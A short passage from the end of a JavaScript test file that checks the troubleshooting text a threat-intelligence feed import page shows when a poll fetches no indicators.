      "Read **Last Poll Summary**. No objects fetched: the collection is empty or publishes no indicators. Unsupported patterns: the provider uses pattern features this page lists as skipped. Below minimum confidence: lower **Minimum Confidence**. Already inactive: the provider sent indicators that were already revoked or expired.",
    );
  });
});
